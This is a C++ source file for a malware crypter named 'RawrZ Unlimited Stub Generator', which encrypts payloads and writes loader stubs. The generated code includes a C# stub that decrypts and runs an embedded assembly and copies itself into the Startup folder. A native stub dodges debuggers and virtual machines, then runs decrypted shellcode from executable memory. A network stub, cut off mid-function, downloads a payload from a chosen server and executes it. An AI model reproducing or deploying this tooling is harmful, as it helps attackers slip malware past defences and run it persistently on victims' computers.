#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <random>
#include <algorithm>
#include <chrono>
#include <thread>
#include <filesystem>
#include <vector>
#include <limits>
#include <windows.h>
#include <set>
#include <map>
#include <cmath>

// Include the simple plugin integration
#include "SimplePluginIntegration.h"

// Enhanced Unlimited Stub Generator Class Declaration
class RawrZUnlimitedStubGenerator {
private:
    std::string currentKey;
    std::string currentIV;
    std::vector<std::string> stubTemplates;
    
public:
    RawrZUnlimitedStubGenerator() {
        initializeTemplates();
        generateNewKeys();
    }
    
    void initializeTemplates();
    void generateNewKeys();
    std::string generateRandomString(size_t length, bool cryptoSecure = false);
    std::vector<unsigned char> encryptWithAES(const std::vector<unsigned char>& data);
    std::string base64Encode(const std::vector<unsigned char>& data);
    std::string generateCSharpAESStub(const std::vector<std::string>& chunks, bool addAntiAnalysis = false);
    bool generateAndAttachStub(const std::string& targetFile, const std::string& stubType, bool addAntiAnalysis = false);
    void showStubTypes();
    std::string getStubType(int index);
    
    // New enhanced features
    void compareStubs(const std::string& stub1Path, const std::string& stub2Path);
    void batchGenerateStubs(const std::vector<std::string>& targetFiles, const std::string& stubType, bool addAntiAnalysis);
    void selectStubAndExe();
    std::string analyzeStubRandomness(const std::string& stubPath);
    double calculateStubSimilarity(const std::string& stub1, const std::string& stub2);
};

// OpenSSL includes for real crypto (optional)
#ifdef USE_OPENSSL
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/des.h>
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/bio.h> // Required for BIO_new, BIO_f_base64, BIO_s_mem, BIO_push, BIO_flush, BIO_get_mem_ptr, BIO_set_close, BIO_free_all
#include <openssl/err.h> // Required for ERR_get_error
#endif

// Configuration structure for persistence
struct RawrZConfig {
    bool useOpenSSL = false;
    bool useEnhancedEncryption = true;
    bool useAntiAnalysis = true;
    bool useStealth = true;
    std::string defaultOutputDir = "./output/";
    std::string logFile = "./rawrz.log";
    int encryptionRounds = 3;
    bool verboseLogging = true;
};

// Global configuration
RawrZConfig g_config;

// Simple SHA256 implementation without OpenSSL dependency
std::string generateHash(const std::string& data) {
    unsigned int hash = 0;
    for (char c : data) {
        hash = ((hash << 5) + hash) + c;
    }
    
    std::stringstream ss;
    ss << std::hex << std::setw(8) << std::setfill('0') << hash;
    return ss.str();
}

// Enhanced error handling wrapper
template<typename Func>
auto safeExecute(Func func, const std::string& operation) -> decltype(func()) {
    try {
        return func();
    } catch (const std::exception& e) {
        std::cerr << "Error in " << operation << ": " << e.what() << std::endl;
        if (g_config.verboseLogging) {
            std::ofstream logFile(g_config.logFile, std::ios::app);
            if (logFile) {
                logFile << "[" << std::chrono::system_clock::now().time_since_epoch().count() 
                       << "] ERROR in " << operation << ": " << e.what() << std::endl;
                logFile.close();
            }
        }
        throw;
    }
}

// Configuration persistence methods
void saveConfiguration(const std::string& filePath = "rawrz_config.ini") {
    try {
        std::ofstream file(filePath);
        if (!file) {
            throw std::runtime_error("Cannot open configuration file: " + filePath);
        }

        file << "[General]\n";
        file << "useOpenSSL=" << (g_config.useOpenSSL ? "true" : "false") << "\n";
        file << "useEnhancedEncryption=" << (g_config.useEnhancedEncryption ? "true" : "false") << "\n";
        file << "useAntiAnalysis=" << (g_config.useAntiAnalysis ? "true" : "false") << "\n";
        file << "useStealth=" << (g_config.useStealth ? "true" : "false") << "\n";
        file << "defaultOutputDir=" << g_config.defaultOutputDir << "\n";
        file << "logFile=" << g_config.logFile << "\n";
        file << "encryptionRounds=" << g_config.encryptionRounds << "\n";
        file << "verboseLogging=" << (g_config.verboseLogging ? "true" : "false") << "\n";
        
        file.close();
        std::cout << "Configuration saved to: " << filePath << std::endl;
        
        if (g_config.verboseLogging) {
            std::ofstream logFile(g_config.logFile, std::ios::app);
            if (logFile) {
                logFile << "[" << std::chrono::system_clock::now().time_since_epoch().count() 
                       << "] Configuration saved to: " << filePath << std::endl;
                logFile.close();
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Failed to save configuration: " << e.what() << std::endl;
    }
}

void loadConfiguration(const std::string& filePath = "rawrz_config.ini") {
    try {
        std::ifstream file(filePath);
        if (!file) {
            std::cout << "Configuration file not found, using defaults" << std::endl;
            return;
        }

        std::string line;
        while (std::getline(file, line)) {
            size_t pos = line.find('=');
            if (pos != std::string::npos) {
                std::string key = line.substr(0, pos);
                std::string value = line.substr(pos + 1);
                
                if (key == "useOpenSSL") g_config.useOpenSSL = (value == "true");
                else if (key == "useEnhancedEncryption") g_config.useEnhancedEncryption = (value == "true");
                else if (key == "useAntiAnalysis") g_config.useAntiAnalysis = (value == "true");
                else if (key == "useStealth") g_config.useStealth = (value == "true");
                else if (key == "defaultOutputDir") g_config.defaultOutputDir = value;
                else if (key == "logFile") g_config.logFile = value;
                else if (key == "encryptionRounds") g_config.encryptionRounds = std::stoi(value);
                else if (key == "verboseLogging") g_config.verboseLogging = (value == "true");
            }
        }
        file.close();
        std::cout << "Configuration loaded from: " << filePath << std::endl;
        
        if (g_config.verboseLogging) {
            std::ofstream logFile(g_config.logFile, std::ios::app);
            if (logFile) {
                logFile << "[" << std::chrono::system_clock::now().time_since_epoch().count() 
                       << "] Configuration loaded from: " << filePath << std::endl;
                logFile.close();
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Failed to load configuration: " << e.what() << std::endl;
    }
}

// Enhanced logging function
void logMessage(const std::string& message, const std::string& level = "INFO") {
    if (g_config.verboseLogging) {
        std::ofstream logFile(g_config.logFile, std::ios::app);
        if (logFile) {
            logFile << "[" << std::chrono::system_clock::now().time_since_epoch().count() 
                   << "] [" << level << "] " << message << std::endl;
            logFile.close();
        }
    }
    std::cout << "[" << level << "] " << message << std::endl;
}

// Encryption function that can use OpenSSL or custom implementation
std::vector<char> encryptData(const std::vector<char>& data, const std::string& method, bool useOpenSSL) {
    return safeExecute([&]() -> std::vector<char> {
        if (useOpenSSL) {
#ifdef USE_OPENSSL
            if (method == "AES256CBC") {
                std::vector<uint8_t> input(data.begin(), data.end());
                
                std::vector<uint8_t> key(32); // 256-bit key
                std::vector<uint8_t> iv(16);  // 128-bit IV
                
                // Generate random key/IV for production
                if (RAND_bytes(key.data(), 32) != 1 || RAND_bytes(iv.data(), 16) != 1) {
                    throw std::runtime_error("Failed to generate random key/IV");
                }
                
                // Initialize OpenSSL
                OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS | 
                                   OPENSSL_INIT_ADD_ALL_CIPHERS | 
                                   OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);
                
                EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                if (!ctx) {
                    throw std::runtime_error("Failed to create EVP_CIPHER_CTX");
                }
                
                // Initialize encryption
                if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data()) != 1) {
                    EVP_CIPHER_CTX_free(ctx);
                    throw std::runtime_error("Failed to initialize encryption");
                }
                
                // Prepare output buffer
                std::vector<uint8_t> encrypted(input.size() + EVP_MAX_BLOCK_LENGTH);
                int outLen = 0;
                
                // Encrypt the data
                if (EVP_EncryptUpdate(ctx, encrypted.data(), &outLen, input.data(), input.size()) != 1) {
                    EVP_CIPHER_CTX_free(ctx);
                    throw std::runtime_error("Failed to encrypt data");
                }
                
                int finalLen = 0;
                if (EVP_EncryptFinal_ex(ctx, encrypted.data() + outLen, &finalLen) != 1) {
                    EVP_CIPHER_CTX_free(ctx);
                    throw std::runtime_error("Failed to finalize encryption");
                }
                
                encrypted.resize(outLen + finalLen);
                EVP_CIPHER_CTX_free(ctx);
                
                // Prepend key and IV to encrypted data for decryption
                std::vector<char> result;
                result.insert(result.end(), key.begin(), key.end());
                result.insert(result.end(), iv.begin(), iv.end());
                result.insert(result.end(), encrypted.begin(), encrypted.end());
                
                return result;
            }
#endif
        }
        
        // Fallback to custom encryption
        std::vector<char> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= 0xAA; // Simple XOR encryption
        }
        return encrypted;
    }, "encryptData");
}

// Enhanced encryption methods
std::vector<char> encryptHybrid(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
        std::vector<char> encrypted = data;
        
        // Hybrid encryption: XOR + bit rotation + salt
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        // Add salt
        char salt = dis(gen);
        encrypted.insert(encrypted.begin(), salt);
        
        // Layer 1: XOR with salt
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= salt;
        }
        
        // Layer 2: Bit rotation
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] = (encrypted[i] << 1) | (encrypted[i] >> 7);
        }
        
        // Layer 3: Position-based XOR
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= static_cast<unsigned char>(i & 0xFF);
        }
        
        return encrypted;
    }, "encryptHybrid");
}

std::vector<char> encryptTriple(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
        std::vector<char> encrypted = data;
        
        // Triple encryption: 3 rounds with different keys
        std::vector<unsigned char> keys = {0x55, 0xAA, 0x33};
        
        for (int round = 0; round < g_config.encryptionRounds; ++round) {
            for (size_t i = 0; i < encrypted.size(); ++i) {
                encrypted[i] ^= keys[round % keys.size()];
                encrypted[i] = (encrypted[i] << 2) | (encrypted[i] >> 6);
                encrypted[i] ^= (i + round) % 256;
            }
        }
        
        return encrypted;
    }, "encryptTriple");
}

std::vector<char> encryptEnhanced(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
        std::vector<char> encrypted = data;
        
        // Enhanced encryption: multiple layers with checksum
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        // Generate key
        char key = dis(gen);
        encrypted.insert(encrypted.begin(), key);
        
        // Layer 1: XOR with key
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= key;
        }
        
        // Layer 2: Bit rotation with position
        for (size_t i = 1; i < encrypted.size(); ++i) {
            int shift = (i % 7) + 1;
            encrypted[i] = (encrypted[i] << shift) | (encrypted[i] >> (8 - shift));
        }
        
        // Layer 3: S-Box transformation
        unsigned char sbox[256];
        for (int i = 0; i < 256; i++) {
            sbox[i] = (i * 7 + 13) % 256;
        }
        
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] = sbox[(unsigned char)encrypted[i]];
        }
        
        // Layer 4: Final XOR
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= static_cast<unsigned char>(0xAA);
        }
        
        return encrypted;
    }, "encryptEnhanced");
}

std::vector<char> encryptCrossPlatform(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
        std::vector<char> encrypted = data;
        
        // Cross-platform compatible encryption
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        // Add IV
        char iv = dis(gen);
        encrypted.insert(encrypted.begin(), iv);
        
        // CBC-like encryption
        char prev = iv;
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= prev;
            encrypted[i] = encrypted[i] ^ 0x42 ^ (i % 256);
            prev = encrypted[i];
        }
        
        return encrypted;
    }, "encryptCrossPlatform");
}

// Real OpenSSL CBC encryption (when OpenSSL is available)
std::vector<char> encryptCBC(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
#ifdef USE_OPENSSL
        if (g_config.useOpenSSL) {
            std::vector<uint8_t> input(data.begin(), data.end());
            
            std::vector<uint8_t> key(32); // 256-bit key
            std::vector<uint8_t> iv(16);  // 128-bit IV
            
            // Generate random key/IV for production
            if (RAND_bytes(key.data(), 32) != 1 || RAND_bytes(iv.data(), 16) != 1) {
                throw std::runtime_error("Failed to generate random key/IV");
            }
            
            // Initialize OpenSSL
            OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS | 
                               OPENSSL_INIT_ADD_ALL_CIPHERS | 
                               OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);
            
            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            if (!ctx) {
                throw std::runtime_error("Failed to create EVP_CIPHER_CTX");
            }
            
            // Initialize CBC encryption
            if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data()) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to initialize CBC encryption");
            }
            
            // Prepare output buffer
            std::vector<uint8_t> encrypted(input.size() + EVP_MAX_BLOCK_LENGTH);
            int outLen = 0;
            
            // Encrypt the data
            if (EVP_EncryptUpdate(ctx, encrypted.data(), &outLen, input.data(), input.size()) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to encrypt data with CBC");
            }
            
            int finalLen = 0;
            if (EVP_EncryptFinal_ex(ctx, encrypted.data() + outLen, &finalLen) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to finalize CBC encryption");
            }
            
            encrypted.resize(outLen + finalLen);
            EVP_CIPHER_CTX_free(ctx);
            
            // Prepend key and IV to encrypted data for decryption
            std::vector<char> result;
            result.insert(result.end(), key.begin(), key.end());
            result.insert(result.end(), iv.begin(), iv.end());
            result.insert(result.end(), encrypted.begin(), encrypted.end());
            
            return result;
        }
#endif
        
        // Fallback to custom XOR encryption when OpenSSL not available
        std::vector<char> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= 0x42 ^ (i % 256);
        }
        return encrypted;
    }, "encryptCBC");
}

// Custom XOR encryption (renamed to be accurate)
std::vector<char> encryptCustomXOR(const std::vector<char>& data) {
    return safeExecute([&]() -> std::vector<char> {
        std::vector<char> encrypted = data;
        
        // Custom XOR algorithm (NOT real CBC)
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        // Add IV
        char iv = dis(gen);
        encrypted.insert(encrypted.begin(), iv);
        
        // Custom XOR with position-based key
        char prev = iv;
        for (size_t i = 1; i < encrypted.size(); ++i) {
            encrypted[i] ^= prev;
            encrypted[i] = encrypted[i] ^ 0x42 ^ (i % 256);
            prev = encrypted[i];
        }
        
        return encrypted;
    }, "encryptCustomXOR");
}

// AES Encryption with user-provided keys
std::vector<char> encryptFileAES(const std::vector<char>& data, const std::string& key) {
    return safeExecute([&]() -> std::vector<char> {
#ifdef USE_OPENSSL
        if (g_config.useOpenSSL) {
            std::vector<uint8_t> input(data.begin(), data.end());
            
            // Use provided key or generate random one
            std::vector<uint8_t> keyBytes;
            if (key.empty()) {
                keyBytes.resize(32); // 256-bit key
                if (RAND_bytes(keyBytes.data(), 32) != 1) {
                    throw std::runtime_error("Failed to generate random key");
                }
            } else {
                // Hash the provided key to get 256-bit
                EVP_MD_CTX* ctx = EVP_MD_CTX_new();
                EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
                EVP_DigestUpdate(ctx, key.c_str(), key.length());
                keyBytes.resize(32);
                unsigned int digestLen;
                EVP_DigestFinal_ex(ctx, keyBytes.data(), &digestLen);
                EVP_MD_CTX_free(ctx);
            }
            
            std::vector<uint8_t> iv(16);  // 128-bit IV
            if (RAND_bytes(iv.data(), 16) != 1) {
                throw std::runtime_error("Failed to generate random IV");
            }
            
            // Initialize OpenSSL
            OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS | 
                               OPENSSL_INIT_ADD_ALL_CIPHERS | 
                               OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);
            
            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            if (!ctx) {
                throw std::runtime_error("Failed to create EVP_CIPHER_CTX");
            }
            
            // Initialize AES-256-CBC encryption
            if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, keyBytes.data(), iv.data()) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to initialize AES encryption");
            }
            
            // Prepare output buffer
            std::vector<uint8_t> encrypted(input.size() + EVP_MAX_BLOCK_LENGTH);
            int outLen = 0;
            
            // Encrypt the data
            if (EVP_EncryptUpdate(ctx, encrypted.data(), &outLen, input.data(), input.size()) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to encrypt data with AES");
            }
            
            int finalLen = 0;
            if (EVP_EncryptFinal_ex(ctx, encrypted.data() + outLen, &finalLen) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                throw std::runtime_error("Failed to finalize AES encryption");
            }
            
            encrypted.resize(outLen + finalLen);
            EVP_CIPHER_CTX_free(ctx);
            
            // Prepend key and IV to encrypted data for decryption
            std::vector<char> result;
            result.insert(result.end(), keyBytes.begin(), keyBytes.end());
            result.insert(result.end(), iv.begin(), iv.end());
            result.insert(result.end(), encrypted.begin(), encrypted.end());
            
            return result;
        }
#endif
        
        // Fallback to custom encryption when OpenSSL not available
        std::vector<char> encrypted = data;
        std::string fallbackKey = key.empty() ? "RawrZDefaultKey2024" : key;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= fallbackKey[i % fallbackKey.length()];
        }
        return encrypted;
    }, "encryptFileAES");
}

// Random key generation
std::string generateRandomKey(size_t length = 32) {
    return safeExecute([&]() -> std::string {
        const std::string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, charset.length() - 1);
        
        std::string key;
        key.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            key += charset[dis(gen)];
        }
        return key;
    }, "generateRandomKey");
}

// Base64 encoding
std::string base64Encode(const std::vector<char>& data) {
    return safeExecute([&]() -> std::string {
#ifdef USE_OPENSSL
        if (g_config.useOpenSSL) {
            BIO *bio, *b64;
            BUF_MEM *bufferPtr;

            b64 = BIO_new(BIO_f_base64());
            bio = BIO_new(BIO_s_mem());
            bio = BIO_push(b64, bio);

            BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
            BIO_write(bio, data.data(), data.size());
            BIO_flush(bio);
            BIO_get_mem_ptr(bio, &bufferPtr);
            BIO_set_close(bio, BIO_NOCLOSE);
            BIO_free_all(bio);

            return std::string(bufferPtr->data, bufferPtr->length);
        }
#endif
        
        // Fallback Base64 implementation
        const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        
        std::string result;
        int val = 0, valb = -6;
        for (unsigned char c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(base64_chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }, "base64Encode");
}

// Split data into chunks for stub generation
std::vector<std::string> splitIntoChunks(const std::vector<char>& data, size_t chunkSize = 1000) {
    std::vector<std::string> chunks;
    std::string base64Data = base64Encode(data);
    
    for (size_t i = 0; i < base64Data.length(); i += chunkSize) {
        chunks.push_back(base64Data.substr(i, chunkSize));
    }
    
    return chunks;
}

// C# Stub Template
std::string generateCSharpStub(const std::vector<std::string>& chunks, 
                               const std::string& key,
                               bool addObfuscation = false,
                               bool addStartup = false) {
    std::stringstream stub;
    
    stub << "using System;\n";
    stub << "using System.IO;\n";
    stub << "using System.Reflection;\n";
    stub << "using System.Security.Cryptography;\n";
    stub << "using System.Text;\n";
    stub << "using System.Runtime.InteropServices;\n\n";
    
    if (addStartup) {
        stub << "using Microsoft.Win32;\n";
    }
    
    stub << "class Program\n";
    stub << "{\n";
    
    // Add obfuscation if requested
    if (addObfuscation) {
        stub << "    static string Deobfuscate(string input)\n";
        stub << "    {\n";
        stub << "        char[] chars = input.ToCharArray();\n";
        stub << "        for (int i = 0; i < chars.Length; i++)\n";
        stub << "        {\n";
        stub << "            chars[i] = (char)(chars[i] ^ 0x42);\n";
        stub << "        }\n";
        stub << "        return new string(chars);\n";
        stub << "    }\n\n";
    }
    
    // Add startup integration if requested
    if (addStartup) {
        stub << "    static void AddToStartup()\n";
        stub << "    {\n";
        stub << "        try\n";
        stub << "        {\n";
        stub << "            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);\n";
        stub << "            string exePath = Assembly.GetExecutingAssembly().Location;\n";
        stub << "            string startupExe = Path.Combine(startupPath, Path.GetFileName(exePath));\n";
        stub << "            if (!File.Exists(startupExe))\n";
        stub << "            {\n";
        stub << "                File.Copy(exePath, startupExe);\n";
        stub << "            }\n";
        stub << "        }\n";
        stub << "        catch { }\n";
        stub << "    }\n\n";
    }
    
    // Add encrypted payload chunks
    stub << "    static string[] GetPayload()\n";
    stub << "    {\n";
    stub << "        return new string[] {\n";
    for (size_t i = 0; i < chunks.size(); ++i) {
        stub << "            \"" << chunks[i] << "\"";
        if (i < chunks.size() - 1) stub << ",";
        stub << "\n";
    }
    stub << "        };\n";
    stub << "    }\n\n";
    
    // Add decryption method
    stub << "    static byte[] DecryptPayload(string[] chunks, string key)\n";
    stub << "    {\n";
    stub << "        try\n";
    stub << "        {\n";
    stub << "            string combined = string.Join(\"\", chunks);\n";
    stub << "            byte[] encrypted = Convert.FromBase64String(combined);\n";
    stub << "            \n";
    stub << "            using (Aes aes = Aes.Create())\n";
    stub << "            {\n";
    stub << "                aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32, '\\0').Substring(0, 32));\n";
    stub << "                aes.IV = new byte[16];\n";
    stub << "                aes.Mode = CipherMode.CBC;\n";
    stub << "                aes.Padding = PaddingMode.PKCS7;\n";
    stub << "                \n";
    stub << "                using (ICryptoTransform decryptor = aes.CreateDecryptor())\n";
    stub << "                {\n";
    stub << "                    return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);\n";
    stub << "                }\n";
    stub << "            }\n";
    stub << "        }\n";
    stub << "        catch\n";
    stub << "        {\n";
    stub << "            return null;\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    // Main method
    stub << "    static void Main()\n";
    stub << "    {\n";
    if (addStartup) {
        stub << "        AddToStartup();\n";
    }
    stub << "        \n";
    stub << "        string key = \"" << key << "\";\n";
    stub << "        string[] payload = GetPayload();\n";
    stub << "        byte[] decrypted = DecryptPayload(payload, key);\n";
    stub << "        \n";
    stub << "        if (decrypted != null)\n";
    stub << "        {\n";
    stub << "            try\n";
    stub << "            {\n";
    stub << "                Assembly assembly = Assembly.Load(decrypted);\n";
    stub << "                MethodInfo main = assembly.EntryPoint;\n";
    stub << "                if (main != null)\n";
    stub << "                {\n";
    stub << "                    main.Invoke(null, null);\n";
    stub << "                }\n";
    stub << "            }\n";
    stub << "            catch { }\n";
    stub << "        }\n";
    stub << "    }\n";
    stub << "}\n";
    
    return stub.str();
}

// Generate Simple Stub
std::string generateSimpleStub(const std::string& payloadPath, const std::string& encryptionMethod) {
    std::string stub = R"(
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// Decryption function
std::vector<char> decryptData(const std::vector<char>& data, const std::string& method) {
    std::vector<char> decrypted = data;
    
    if (method == "Hybrid") {
        char salt = decrypted[0];
        decrypted.erase(decrypted.begin());
        
        // Reverse position-based XOR
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] ^= ((i + 1) % 256);
        }
        
        // Reverse bit rotation
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] = (decrypted[i] >> 1) | (decrypted[i] << 7);
        }
        
        // Reverse XOR with salt
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] ^= salt;
        }
        
    } else if (method == "Triple") {
        std::vector<unsigned char> keys = {0x55, 0xAA, 0x33};
        
        for (int round = 2; round >= 0; --round) {
            for (size_t i = 0; i < decrypted.size(); ++i) {
                decrypted[i] ^= (i + round) % 256;
                decrypted[i] = (decrypted[i] >> 2) | (decrypted[i] << 6);
                decrypted[i] ^= keys[round];
            }
        }
        
    } else if (method == "Enhanced") {
        char key = decrypted[0];
        decrypted.erase(decrypted.begin());
        
        // Reverse final XOR
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] ^= 0xAA;
        }
        
        // Reverse S-Box
        unsigned char sbox[256];
        for (int i = 0; i < 256; i++) {
            sbox[i] = (i * 7 + 13) % 256;
        }
        
        unsigned char reverse_sbox[256];
        for (int i = 0; i < 256; i++) {
            reverse_sbox[sbox[i]] = i;
        }
        
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] = reverse_sbox[(unsigned char)decrypted[i]];
        }
        
        // Reverse bit rotation
        for (size_t i = 0; i < decrypted.size(); ++i) {
            int shift = (i % 7) + 1;
            decrypted[i] = (decrypted[i] >> shift) | (decrypted[i] << (8 - shift));
        }
        
        // Reverse XOR with key
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] ^= key;
        }
        
    } else if (method == "CrossPlatform") {
        char iv = decrypted[0];
        decrypted.erase(decrypted.begin());
        
        // Reverse CBC-like decryption
        char prev = iv;
        for (size_t i = 0; i < decrypted.size(); ++i) {
            char current = decrypted[i];
            decrypted[i] = decrypted[i] ^ 0x42 ^ ((i + 1) % 256);
            decrypted[i] ^= prev;
            prev = current;
        }
        
    } else {
        // Default simple XOR
        char key = decrypted[0];
        decrypted.erase(decrypted.begin());
        
        for (size_t i = 0; i < decrypted.size(); ++i) {
            decrypted[i] ^= key;
        }
    }
    
    return decrypted;
}

// Anti-debugging check
bool isDebugged() {
    if (IsDebuggerPresent()) return true;
    
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return true;
    
    // Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if ((end - start) > 150) return true; // Debugger detected
    
    return false;
}

// VM detection
bool isVirtualMachine() {
    // Check for common VM processes
    const char* vmProcesses[] = {
        "vmsrvc.exe", "vmusrvc.exe", "vmtoolsd.exe", "vboxservice.exe",
        "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (const char* vmProc : vmProcesses) {
                if (_stricmp(pe32.szExeFile, vmProc) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return false;
}

int main() {
    // Anti-analysis checks
    if (isDebugged()) {
        return 1; // Exit if debugged
    }
    
    if (isVirtualMachine()) {
        return 1; // Exit if VM detected
    }
    
    try {
        // Read encrypted payload
        std::ifstream file(")" + payloadPath + R"(", std::ios::binary);
        if (!file) {
            return 1;
        }
        
        std::vector<char> encryptedData(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        file.close();
        
        // Decrypt payload
        std::vector<char> decryptedData = decryptData(encryptedData, ")" + encryptionMethod + R"(");
        
        // Allocate memory for execution
        LPVOID execMem = VirtualAlloc(NULL, decryptedData.size(), 
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!execMem) {
            return 1;
        }
        
        // Copy decrypted payload to executable memory
        memcpy(execMem, decryptedData.data(), decryptedData.size());
        
        // Execute payload
        typedef int (*PayloadFunc)();
        PayloadFunc payload = (PayloadFunc)execMem;
        payload();
        
        // Cleanup
        VirtualFree(execMem, 0, MEM_RELEASE);
        
    } catch (...) {
        return 1;
    }
    
    return 0;
}
)";
    return stub;
}

// Generate Network Stub
std::string generateNetworkStub(const std::string& server, const std::string& port) {
    std::string stub = R"(
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "ws2_32.lib")

// Network payload downloader and executor
class NetworkStub {
private:
    std::string server;
    std::string port;
    
public:
    NetworkStub(const std::string& srv, const std::string& prt) 
        : server(srv), port(prt) {}
    
    bool downloadAndExecute() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return false;
        }
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }
        
        struct addrinfo hints, *result;
        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        
        if (getaddrinfo(server.c_str(), port.c_str(), &hints, &result) != 0) {
            closesocket(sock);
            WSACleanup();
            return false;
        }
        
        if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
            freeaddrinfo(result);
            closesocket(sock);
            WSACleanup();
            return false;
        }
        
        freeaddrinfo(result);
        
        // Send request
        std::string request = "GET /payload HTTP/1.1\\r\\nHost: " + server + "\\r\\n\\r\\n";
        send(sock, request.c_str(), request.length(), 0);
        
        // Receive payload
        std::vector<char> payload;
        char buffer[1024];
        int bytesReceived;
        
        while ((bytesReceived = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
            payload.insert(payload.end(), buffer, buffer + bytesReceived);
        }
        
        closesocket(sock);
        WSACleanup();
        
        if (payload.empty()) {
            return false;
        }
        
        // Execute payload
        LPVOID execMem = VirtualAlloc(NULL, payload.size(), 
